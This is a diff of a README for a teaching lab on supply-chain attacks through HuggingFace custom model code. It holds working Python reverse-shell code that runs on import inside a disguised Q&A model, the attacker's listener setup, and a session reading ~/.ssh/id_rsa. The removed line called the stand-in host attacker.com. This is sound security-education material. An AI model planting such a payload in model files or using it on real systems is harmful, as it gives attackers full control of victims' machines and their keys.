@@ -32,11 +32,13 @@ When `trust_remote_code=True` is set:
 
 ```
 lab-06-supply-chain-attack/
-├── 1_attacker_listener.py      # Attacker's reverse shell listener
-├── 2_victim_loads_model.py     # Victim's "innocent" Q&A chatbot
-├── malicious_model/            # Fake HuggingFace model
-│   ├── config.json             # Points to malicious code
-│   └── reverse_shell_payload.py # Hidden reverse shell + fake model
+├── 1_attacker_listener.py        # Attacker's reverse shell listener
+├── 2_victim_loads_model.py       # Victim's "innocent" Q&A chatbot
+├── malicious_model/              # Fake HuggingFace model
+│   ├── config.json               # Points to malicious code
+│   └── reverse_shell_payload.py  # Hidden reverse shell + Q&A model
+├── .env                          # Configuration (host/port)
+├── .env.example                  # Example configuration
 ├── requirements.txt
 ├── reset.py
 └── README.md
@@ -48,17 +50,18 @@ lab-06-supply-chain-attack/
 
 ```
 ┌─────────────────────────────┐         ┌─────────────────────────────┐
-│      ATTACKER TERMINAL      │         │       VICTIM TERMINAL       │
+│      ATTACKER MACHINE       │         │       VICTIM MACHINE        │
+│      (127.0.0.1)          │         │      (10.165.28.139)        │
 │                             │         │                             │
 │  1. Start listener          │         │  2. Load "helpful" model    │
 │     python 1_attacker_...   │◄────────│     trust_remote_code=True  │
 │                             │ Reverse │                             │
-│  3. Receive shell! 🎉       │  Shell  │  Sees: "Model loaded!"      │
+│  3. Receive shell! 🎉       │  Shell  │  Sees: Working Q&A chatbot  │
 │     Full access to victim   │ Connect │  No idea shell is active    │
 │                             │         │                             │
-│  4. Run commands:           │         │                             │
-│     $ pwd → /home/victim    │         │                             │
-│     $ cat ~/.ssh/id_rsa     │         │                             │
+│  4. Run commands:           │         │  5. Victim asks questions:  │
+│     $ pwd → /home/victim    │         │     "What is AI?" → answer  │
+│     $ cat ~/.ssh/id_rsa     │         │     (model actually works!) │
 └─────────────────────────────┘         └─────────────────────────────┘
 ```
 
@@ -70,9 +73,11 @@ lab-06-supply-chain-attack/
 
 - Python 3.8+
 - Linux/macOS (uses `fork()` and `pty`)
-- **Two terminal windows**
+- **Two machines** (or two terminals for local demo)
 
 ### Setup
+
+**On both machines:**
 
 ```bash
 cd lab-06-supply-chain-attack
@@ -81,13 +86,35 @@ source venv/bin/activate
 pip install -r requirements.txt
 ```
 
+### Configuration
+
+Copy and edit the environment file:
+
+```bash
+cp .env.example .env
+```
+
+Edit `.env` to set attacker's IP:
+
+```dotenv
+# Attacker Configuration
+ATTACKER_HOST=127.0.0.1    # Attacker's IP address
+ATTACKER_PORT=4444           # Port for reverse shell
+```
+
 ---
 
 ## 🎬 Running the Demo
 
-> **Important**: Run victim from a **different directory** to show the attack crossing paths!
+### Step 1: Open Firewall (Attacker Machine)
 
-### Terminal 1: Attacker
+```bash
+sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
+```
+
+### Step 2: Start Attacker Listener
+
+**On attacker machine (127.0.0.1):**
 
 ```bash
 cd lab-06-supply-chain-attack
@@ -101,15 +128,17 @@ You'll see:
 Listening on 127.0.0.1:4444...
 ```
 
-### Terminal 2: Victim (Different Directory!)
+### Step 3: Run Victim Script
+
+**On victim machine (10.165.28.139):**
 
 ```bash
-cd labs  # Parent directory - NOT lab-06!
+cd labs  # Run from parent directory to show different pwd
 source lab-06-supply-chain-attack/venv/bin/activate
 python lab-06-supply-chain-attack/2_victim_loads_model.py
 ```
 
-Victim sees an innocent Q&A chatbot:
+Victim sees a working Q&A chatbot:
 ```
 ==================================================
   Simple Q&A Model - HuggingFace Demo
@@ -118,14 +147,19 @@ Victim sees an innocent Q&A chatbot:
 Loading model: helpful-ai/super-fast-bert
 Model loaded successfully!
 
-You: What is machine learning?
-Bot: That's an interesting question! Based on my training...
+You: What is AI?
+Bot: AI (disambiguation) AI may refer to...
+
+You: What is 2 + 2?
+Bot: 4
 ```
 
-### Back to Terminal 1: Attacker Has Shell! 🎉
+### Step 4: Attacker Has Shell! 🎉
+
+**Back on attacker's terminal:**
 
 ```
-🚨 SHELL CONNECTED! Victim: 127.0.0.1:54321
+🚨 SHELL CONNECTED! Victim: 10.165.28.139:54321
 
 $ pwd
 /home/victim/labs          # ← Victim's directory!
@@ -162,19 +196,23 @@ def _spawn_shell():
     
     if pid == 0:  # Child process
         sock = socket.socket()
-        sock.connect(("attacker.com", 4444))
-        os.dup2(sock.fileno(), 0)  # Redirect stdin
-        os.dup2(sock.fileno(), 1)  # Redirect stdout
-        os.dup2(sock.fileno(), 2)  # Redirect stderr
-        pty.spawn("/bin/bash")     # Interactive shell
+        sock.connect(("127.0.0.1", 4444))
+        os.dup2(sock.fileno(), 0)  # stdin
+        os.dup2(sock.fileno(), 1)  # stdout
+        os.dup2(sock.fileno(), 2)  # stderr
+        pty.spawn("/bin/bash")
         os._exit(0)
     
-    # Parent continues normally - victim notices nothing!
+    # Parent continues normally - victim sees working chatbot!
 
 _spawn_shell()  # Executes on import!
+
+class BackdooredModel:
+    # Real Q&A model using flan-t5-small
+    # Victim gets actual answers while attacker has shell
 ```
 
-### 3. Why `os.fork()` Matters
+### 3. Why `os.fork()` is Critical
 
 | Without Fork | With Fork |
 |-------------|-----------|
@@ -240,7 +278,7 @@ model = AutoModel.from_pretrained(
 |--------|--------|-------|
 | **Exploitability** | 🔴 Easy | Single flag enables attack |
 | **Impact** | 🔴 Critical | Full system compromise |
-| **Detection** | 🔴 Hard | Victim sees nothing suspicious |
+| **Detection** | 🔴 Hard | Victim sees working chatbot |
 | **Prevalence** | 🟡 Medium | Common in tutorials & notebooks |
 
 ---
@@ -259,7 +297,7 @@ This kills any lingering listeners and cleans up temp files.
 
 - [HuggingFace Custom Models](https://huggingface.co/docs/transformers/custom_models)
 - [SafeTensors Format](https://huggingface.co/docs/safetensors)
-- [OWASP ML Security](https://owasp.org/www-project-machine-learning-security-top-10/)
+- [OWASP ML Security Top 10](https://owasp.org/www-project-machine-learning-security-top-10/)
 
 ---
 
